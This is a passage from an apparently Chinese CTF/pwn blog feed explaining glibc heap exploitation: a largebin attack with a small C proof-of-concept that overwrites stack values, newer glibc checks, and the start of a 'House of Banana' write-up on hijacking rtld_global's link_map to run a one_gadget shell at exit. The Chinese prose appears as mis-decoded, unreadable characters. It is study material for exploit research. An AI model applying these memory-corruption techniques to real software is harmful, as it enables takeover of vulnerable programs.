class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))ã€<span class="hljs-number">3</span>ã€‘<br>              &#123;<br>                fwd = fwd-&gt;fd_nextsize;<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;ã€<span class="hljs-number">4</span>ã€‘<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;ã€<span class="hljs-number">5</span>ã€‘<br>                fwd-&gt;bk_nextsize = victim;ã€<span class="hljs-number">6</span>ã€‘<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;ã€<span class="hljs-number">7</span>ã€‘<br>              &#125;<br>            bck = fwd-&gt;bk;ã€<span class="hljs-number">8</span>ã€‘<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;ã€<span class="hljs-number">9</span>ã€‘<br>victim-&gt;fd = fwd;ã€<span class="hljs-number">10</span>ã€‘<br>fwd-&gt;bk = victim;ã€<span class="hljs-number">11</span>ã€‘<br>bck-&gt;fd = victim;ã€<span class="hljs-number">12</span>ã€‘<br></code></pre></td></tr></table></figure><p>ä¸»è¦æ¼æ´ç‚¹åœ¨ã€5ã€‘ã€7ã€‘ã€8ã€‘ã€9ã€‘ã€10ã€‘ã€11ã€‘ã€12ã€‘ï¼Œä¸‹é¢è¿›è¡Œæ¼æ´åŸç†åˆ†æ</p><p>åˆå§‹çŠ¶æ€å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071515961.png"></p><p>æ‰§è¡Œåˆ°ã€7ã€‘åçŠ¶æ€å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071516440.png" alt="image-20241107151657377"></p><p>æ‰§è¡Œåˆ°æœ€åçŠ¶æ€å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411071521015.png" alt="image-20241107152134941"></p><p>ä¿®æ”¹äº†é›¶ä¸ªç¯¡æ”¹åœ°å€ä¸ºvictimçš„é¦–åœ°å€</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin test\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> * p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8</span>);<br><br>    <span class="hljs-type">size_t</span> * p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br>    <span class="hljs-built_in">free</span>(p2);<br><br>    p1[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> )(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é«˜ç‰ˆæœ¬largebin-arrackæ”»å‡»"><a href="#é«˜ç‰ˆæœ¬largebin-arrackæ”»å‡»" class="headerlink" title="é«˜ç‰ˆæœ¬largebin arrackæ”»å‡»"></a>é«˜ç‰ˆæœ¬largebin arrackæ”»å‡»</h2><p>å…³äºglib2.30ä»¥åï¼Œlargebin arrackæ”»å‡»ç”¨ä¸‹é¢è¿™ä¸ªåˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert (chunk_main_arena (bck-&gt;bk));<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>      &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      <span class="hljs-comment">//......</span><br>                  &#125;<br>                  <span class="hljs-comment">//......</span><br>              &#125;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æºç ï¼Œå¤šåŠ äº†ä¸¤ä¸ªæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-comment">/* place chunk in bin */</span>   <br><br>     <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>       &#123;<br>         victim_index = smallbin_index (size);<br>         bck = bin_at (av, victim_index);<br>         fwd = bck-&gt;fd;<br>       &#125;<br>     <span class="hljs-keyword">else</span><br>       &#123;<br>         victim_index = largebin_index (size);<br>         bck = bin_at (av, victim_index);<br>         fwd = bck-&gt;fd;<br><br>         <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>         <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<br>             <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>             size |= PREV_INUSE;<br>             <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>             assert (chunk_main_arena (bck-&gt;bk));<br>             <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>   &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>               &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br><br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>               &#125;<br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 assert (chunk_main_arena (fwd));<br>                 <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))<br>                   &#123;<br>                     fwd = fwd-&gt;fd_nextsize;<br>assert (chunk_main_arena (fwd));<br>                   &#125;<br><br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>== (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                   <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                   fwd = fwd-&gt;fd;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     victim-&gt;fd_nextsize = fwd;<br>                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                     <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>                       malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);  <span class="hljs-comment">//å¤šçš„æ£€æŸ¥</span><br>                     fwd-&gt;bk_nextsize = victim;<br>                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                   &#125;<br>                 bck = fwd-&gt;bk;<br>                 <span class="hljs-keyword">if</span> (bck-&gt;fd != fwd) <span class="hljs-comment">//å¤šçš„æ£€æŸ¥</span><br>                   malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br>               &#125;<br>           &#125;<br>         <span class="hljs-keyword">else</span><br>           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br><br>     mark_bin (av, victim_index);<br>     victim-&gt;bk = bck;<br>     victim-&gt;fd = fwd;<br>     fwd-&gt;bk = victim;<br>     bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>House-of-Bananaæ”»å‡»</title>
    <link href="/2024/11/05/House-of-Banana%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/05/House-of-Banana%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h1><h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>ä¸Šå‘¨æ‰“äº†å›½å†…å«é‡‘é‡æ¯”è¾ƒé«˜çš„èµ›äº‹å¼ºç½‘æ¯ï¼Œå‘ç°è‡ªå·±è¿˜æ˜¯å’Œé«˜æ‰‹å·®è·å¾ˆå¤§ï¼Œå…³äºé«˜çº§æ”»å‡»æ‰‹æ³•ç§¯ç´¯è¾ƒå°‘ï¼Œä»¥èµ›ä»£ç»ƒå­¦ä¹ ä¸€ä¸‹ç›¸å…³çŸ¥è¯†ç‚¹ â€” House of Banana</p><hr><h2 id="æ”»å‡»æ‰‹æ³•æ·±åº¦è§£æ"><a href="#æ”»å‡»æ‰‹æ³•æ·±åº¦è§£æ" class="headerlink" title="æ”»å‡»æ‰‹æ³•æ·±åº¦è§£æ"></a>æ”»å‡»æ‰‹æ³•æ·±åº¦è§£æ</h2><p>è¿™ç§æ”»å‡»æ‰‹æ³•æ˜¯æ˜Ÿç›Ÿçš„<a href="https://www.anquanke.com/post/id/222948#comment">ha1vk</a>å¸ˆå‚…æœ€å¼€å§‹åˆ©ç”¨çš„è¿™ç§æ‰‹æ³•ï¼Œå­¦ä¹ ä¸¤å¤©åï¼Œæ‰å‘ç°è¿™ç§æ‰‹æ³•çš„å¥¥å¦™ï¼Œåˆ©ç”¨çš„æ¡ä»¶é™åˆ¶ä¹Ÿæ˜¯æ¯”è¾ƒå°‘ï¼Œæ˜¯ä¸€ç§ååˆ†ä¾¿æ·çš„æ‰‹æ³•</p><p>é€‚ç”¨åœºæ™¯ï¼ˆæ»¡è¶³ä»»æ„ä¸€ä¸ªæ¡ä»¶å³å¯ï¼‰</p><ul><li>ç¨‹åºèƒ½å¤Ÿæ˜¾ç¤ºçš„æ‰§è¡Œexitå‡½æ•°</li><li>ç¨‹åºé€šè¿‡libc_start_mainå¯åŠ¨çš„ä¸»å‡½æ•°ï¼Œä¸”ä¸»å‡½æ•°èƒ½å¤Ÿç»“æŸ</li></ul><h3 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>bananaåŠ«æŒçš„æ˜¯rtld_globalè¿™ä¸ªç»“æ„ä½“ ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨åˆ©ç”¨exitå‡½æ•°é€€å‡ºçš„æ—¶å€™ï¼Œç¨‹åºä¼šè°ƒç”¨è¿™ä¸ªç»“æ„ä½“ã€‚å…·ä½“åŠ«æŒå…³ç³»å¦‚ä¸‹</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">rtld_global</span> -&gt;</span> _<span class="hljs-function"><span class="hljs-title">ns_loaded</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">link_map</span> -&gt;</span> ((fini_t) array[i]) ()<br></code></pre></td></tr></table></figure><p>rtld_globalç»“æ„ä½“é‡Œé¢çš„link_mapç»“æ„ä½“ï¼Œå…¶ä¸­rtld_globalä¸­çš„_ns_loadedæŒ‡å‘link_mapç»“æ„ä½“çš„å¤´èŠ‚ç‚¹ã€‚é€šè¿‡åŠ«æŒlink_mapç»“æ„ä½“å°±èƒ½å®ç°å‡½æ•°è°ƒç”¨ã€‚</p><p>ä¸‹é¢æ¥åˆ†æä¸€ä¸‹rtld_globalç»“æ„ä½“ , rtld_globalç»“æ„ä½“ç»„æˆä¹Ÿæ˜¯éå¸¸å‘æ‚çš„ï¼Œæˆ‘ä»¬ç›´å‡»é‡ç‚¹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">rtld_global</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="hljs-comment">     must remain the first element.  Forever.  */</span><br><br><span class="hljs-comment">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_NNS 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  EXTERN <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_namespaces</span><br>  &#123;<br>    <span class="hljs-comment">/* A pointer to the map for the main map.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *_ns_loaded;<br>    <span class="hljs-comment">/* Number of object in the _dl_loaded list.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_nloaded;<br>    <span class="hljs-comment">/* Direct pointer to the searchlist of the main object.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_scope_elem</span> *_ns_main_searchlist;<br>    <span class="hljs-comment">/* This is zero at program start to signal that the global scope map is</span><br><span class="hljs-comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="hljs-comment">       reset if in _dl_close if the last global object is removed.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_alloc;<br><br>    <span class="hljs-comment">/* During dlopen, this is the number of objects that still need to</span><br><span class="hljs-comment">       be added to the global scope map.  It has to be taken into</span><br><span class="hljs-comment">       account when resizing the map, for future map additions after</span><br><span class="hljs-comment">       recursive dlopen calls from ELF constructors.  */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _ns_global_scope_pending_adds;<br><br>    <span class="hljs-comment">/* Once libc.so has been loaded into the namespace, this points to</span><br><span class="hljs-comment">       its link map.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *libc_map; ##link_mapç»“æ„ä½“<br><br>    <span class="hljs-comment">/* Search table for unique objects.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">unique_sym_table</span><br>    &#123;<br>      __rtld_lock_define_recursive (, lock)<br>      <span class="hljs-keyword">struct</span> <span class="hljs-title class_">unique_sym</span><br>      &#123;<br>    <span class="hljs-type">uint32_t</span> hashval;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *map;  <br>      &#125; *entries;<br>      <span class="hljs-type">size_t</span> size;<br>      <span class="hljs-type">size_t</span> n_elements;<br>      <span class="hljs-built_in">void</span> (*free) (<span class="hljs-type">void</span> *);<br>    &#125; _ns_unique_sym_table;<br>    <span class="hljs-comment">/* Keep track of changes to each namespace&#x27; list.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">r_debug</span> _ns_debug;<br>  &#125; _dl_ns[DL_NNS];<br>  <span class="hljs-comment">/* One higher than index of last used namespace.  */</span><br>  EXTERN <span class="hljs-type">size_t</span> _dl_nns;<br>.................................................................................<br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªç»“æ„ä½“é‡Œé¢å­˜æ”¾çš„æ˜¯elfæ–‡ä»¶å„æ®µçš„ç¬¦å·ç»“æ„ä½“_dl_nsï¼Œè€Œè¿™ä¸ªç¬¦å·ç»“æ„ä½“é‡Œé¢åˆå¥—çš„æœ‰ç»“æ„ä½“ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯é‡Œé¢çš„fini_arrayæ®µçš„åŠ¨æ€é“¾æ¥ç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆåˆä¼šåœ¨ _dl_finiä¸­è¢«ä½¿ç”¨ã€‚</p><p>å½“è°ƒç”¨åˆ°_dl_finiå‡½æ•°æ—¶ï¼Œä¼šæ‰§è¡Œæ¯ä¸ª ä¸­æ³¨å†Œçš„ fini å‡½æ•°</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs xl">void<br>_dl_fini (void)<br>&#123;<br>...<br>      struct link_map *maps[nloaded];               <br><br>      unsigned int i;<br>      struct link_map *l;<br>      assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == NULL);<br>      <span class="hljs-function"><span class="hljs-title">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;</span>l_next)<br>        <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (l == l-&gt;</span>l_real)                     <span class="hljs-comment">//æ£€æŸ¥èŠ‚ç‚¹çš„åœ°å€æ˜¯å¦è·Ÿè‡ªå·±ç»“æ„ä½“ä¿å­˜çš„ä¸€è‡´</span><br>          &#123;<br>        assert (i &lt; nloaded);<br><br>        maps[i] = l;<br>        <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_idx = i;<br>        ++i;<br><br>        <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">           are not dlclose()ed from underneath us.  */</span><br>        ++<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_direct_opencount;<br>          &#125;<br>      assert (ns != LM_ID_BASE || i == nloaded);<br>      assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>      unsigned int nmaps = i;<br><br>      _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>             NULL, <span class="hljs-literal">true</span>);<br><br>      __rtld_lock_unlock_recursive (GL(dl_load_lock));<br><br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>        &#123;<br>          struct link_map *l = maps[i];         <span class="hljs-comment">//léå†link_mapçš„é“¾è¡¨</span><br><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_init_called)                 <span class="hljs-comment">//é‡è¦çš„æ£€æŸ¥ç‚¹</span><br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_init_called = <span class="hljs-number">0</span>;                     <br><br>          <span class="hljs-comment">/* Is there a destructor function?  */</span><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[DT_FINI_ARRAY] != NULL<br>              || (ELF_INITFINI &amp;&amp; <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_info[DT_FINI] != NULL))<br>            &#123;<br>              <span class="hljs-comment">/* When debugging print a message first.  */</span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                        &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>            _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                      DSO_FILENAME (<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_name),<br>                      ns);<br><br>              <span class="hljs-comment">/* First see whether an array is given.  */</span><br>              <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[DT_FINI_ARRAY] != NULL)<br>            &#123;<br>              ElfW(Addr) *array =<br>                (E<span class="hljs-function"><span class="hljs-title">lfW</span>(Addr) *) (l-&gt;</span>l_addr<br>                        + <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[DT_FINI_ARRAY]-&gt;</span>d_un.d_ptr);<br>              <span class="hljs-function"><span class="hljs-title">unsigned</span> int i = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[DT_FINI_ARRAYSZ]-&gt;</span>d_un.d_val<br>                        / sizeof (ElfW(Addr)));<br>              <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>                ((fini_t) array[i]) ();                 <span class="hljs-comment">//ç›®æ ‡ä½ç½®</span><br>            &#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œé‡ç‚¹åœ¨äº((fini_t) array[i]) (); è¿™ä¸€è¡Œï¼Œè¿™ä¸€è¡Œä¼šæŠŠfini_tç»“æ„ä½“é‡Œé¢çš„array[i]å½“æˆä¸€ä¸ªå‡½æ•°æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨è¿™é‡Œå¡«ä¸Šæˆ‘ä»¬çš„one_gadgetï¼Œè¿™æ ·ç¨‹åºåœ¨ç»“æŸçš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„one_gadget,ä»è€Œgetshellï¼ˆå½“ç„¶ï¼Œè¿œä¸æ­¢è¿™ä¸€ç§ç”¨æ³•ï¼‰</p><p>å½“ç„¶è¿™ä¸Šé¢è¯´çš„ä¸€åˆ‡éƒ½åœ¨æˆ‘ä»¬çš„link_mapç»“æ„ä½“é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹åœ¨äºlink_mapè¿™ä¸ªç»“æ„ä½“</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">pwndbg&gt; p _rtld_global</span><br><span class="language-xml">$1 = &#123;                                                                                               </span><br><span class="language-xml">  _dl_ns = </span><span class="hljs-template-variable">&#123;&#123;                                                                                         </span><br><span class="hljs-template-variable">      _ns_loaded = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>b<span class="hljs-number">20</span>b<span class="hljs-number">1</span>a<span class="hljs-number">2</span>b<span class="hljs-number">170</span>,     #link_mapç»“æ„ä½“çš„å¤´èŠ‚ç‚¹      </span><br><span class="hljs-template-variable">      _ns_nloaded = <span class="hljs-number">4</span>,                 ## é“¾è¡¨çš„èŠ‚ç‚¹ä¸ªæ•°</span><br><span class="hljs-template-variable">      _ns_main_searchlist = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>b<span class="hljs-number">20</span>b<span class="hljs-number">1</span>a<span class="hljs-number">2</span>b<span class="hljs-number">428</span>,                                                                      